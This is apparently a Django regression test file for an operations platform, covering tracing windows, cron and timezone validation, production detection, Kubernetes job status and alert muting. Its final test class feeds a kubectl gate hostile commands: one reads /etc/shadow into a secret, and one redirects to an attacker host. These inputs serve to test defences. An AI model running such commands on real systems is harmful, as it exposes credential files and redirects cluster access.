import json
from datetime import datetime, timezone as dt_timezone
from types import SimpleNamespace

from django.test import SimpleTestCase, TestCase

from ops.alerting import apply_alert_action
from ops.host_task_schedules import CronExpressionError, compute_next_run, validate_cron_expression
from ops.k8s_views import _k8s_job_status
from ops.serializers import validate_schedule_definition
from ops.tracing_providers import (
    _duration_strings,
    _duration_window,
    _to_iso_from_ms,
    _trace_limit,
)
from ops.views import _target_is_production


class TracingWindowRegressionTests(SimpleTestCase):
    def test_limit_rejects_non_numeric_instead_of_crashing(self):
        self.assertEqual(_trace_limit('abc'), 20)
        self.assertEqual(_trace_limit(None), 20)
        self.assertEqual(_trace_limit('999'), 50)

    def test_mixed_naive_and_aware_bounds_do_not_raise(self):
        start, end = _duration_window({
            'start_time': '2026-01-01T00:00:00Z',
            'end_time': '2026-01-02T00:00:00',
        })
        self.assertLess(start, end)
        self.assertIsNotNone(end.tzinfo)

    def test_skywalking_duration_is_formatted_in_utc(self):
        duration = _duration_strings({
            'start_time': '2026-04-10T11:00:00+08:00',
            'end_time': '2026-04-10T12:00:00+08:00',
        })
        self.assertEqual(duration['start'], '2026-04-10 0300')
        self.assertEqual(duration['end'], '2026-04-10 0400')

    def test_epoch_conversion_is_timezone_aware(self):
        self.assertTrue(_to_iso_from_ms(1711674900000).endswith('+00:00'))


class CronAndTimezoneRegressionTests(SimpleTestCase):
    def test_invalid_cron_value_raises_domain_error(self):
        with self.assertRaises(CronExpressionError):
            validate_cron_expression('a * * * *')
        with self.assertRaises(CronExpressionError):
            validate_cron_expression('*/abc * * * *')

    def test_serializer_rejects_unknown_timezone(self):
        with self.assertRaises(Exception) as ctx:
            validate_schedule_definition({
                'schedule_type': 'cron',
                'cron_expression': '0 * * * *',
                'timezone': 'Mars/Olympus',
            })
        self.assertIn('timezone', str(ctx.exception))

    def test_serializer_accepts_valid_cron(self):
        attrs = validate_schedule_definition({
            'schedule_type': 'cron',
            'cron_expression': '0 * * * *',
            'timezone': 'Asia/Shanghai',
        })
        self.assertIsNotNone(attrs['computed_next_run_at'])
        self.assertIsNone(attrs['interval_seconds'])

    def test_non_numeric_interval_is_rejected(self):
        with self.assertRaises(Exception):
            validate_schedule_definition({
                'schedule_type': 'interval',
                'interval_seconds': 'abc',
                'timezone': 'Asia/Shanghai',
            })


class RiskAndJobRegressionTests(SimpleTestCase):
    def test_task_resource_group_named_prod_is_high_risk(self):
        environment = SimpleNamespace(code='prod', name='生产环境', event_environment=None)
        target = SimpleNamespace(environment=environment)
        self.assertTrue(_target_is_production(target))

    def test_host_environment_string_is_detected(self):
        self.assertTrue(_target_is_production(SimpleNamespace(environment='prod')))
        self.assertFalse(_target_is_production(SimpleNamespace(environment='test')))

    def test_failed_job_is_not_reported_running(self):
        job = SimpleNamespace(
            status=SimpleNamespace(succeeded=0, failed=1, conditions=[]),
            spec=SimpleNamespace(completions=1),
        )
        self.assertEqual(_k8s_job_status(job), 'Failed')

    def test_complete_job_is_complete(self):
        job = SimpleNamespace(
            status=SimpleNamespace(succeeded=1, failed=0, conditions=[]),
            spec=SimpleNamespace(completions=1),
        )
        self.assertEqual(_k8s_job_status(job), 'Complete')


class AlertMuteRegressionTests(TestCase):
    def test_huge_mute_minutes_is_clamped(self):
        from .models import Alert

        alert = Alert.objects.create(title='mute', message='x', level='warning', source='test', fingerprint='mute-fp')
        apply_alert_action(alert, 'mute', actor='tester', mute_minutes=10 ** 18)
        alert.refresh_from_db()
        self.assertEqual(alert.status, Alert.STATUS_MUTED)
        # 上限一年，且不能抛 OverflowError。
        delta = alert.suppressed_until - alert.updated_at
        self.assertLessEqual(delta.days, 366)


class KubectlTaskGateTests(SimpleTestCase):
    def test_task_kubectl_blocks_console_forbidden_options(self):
        from ops.host_tasks import _kubectl_command_steps

        with self.assertRaisesMessage(ValueError, '--from-file'):
            _kubectl_command_steps('kubectl create secret generic x --from-file=k=/etc/shadow')

        steps = _kubectl_command_steps('get pods -n default')
        self.assertEqual(steps[0]['args'], ['get', 'pods', '-n', 'default'])

    def test_task_kubectl_still_accepts_stdin_manifest(self):
        from ops.host_tasks import _kubectl_command_steps

        steps = _kubectl_command_steps('kubectl apply -f -', {'manifest': 'apiVersion: v1'})
        self.assertEqual(steps[0]['args'], ['apply', '-f', '-'])
        self.assertEqual(steps[0]['manifest'], 'apiVersion: v1')

    def test_task_kubectl_blocks_foreign_api_server(self):
        from ops.host_tasks import _kubectl_command_steps

        with self.assertRaisesMessage(ValueError, '--server'):
            _kubectl_command_steps('kubectl --server https://attacker.example.com get pods')
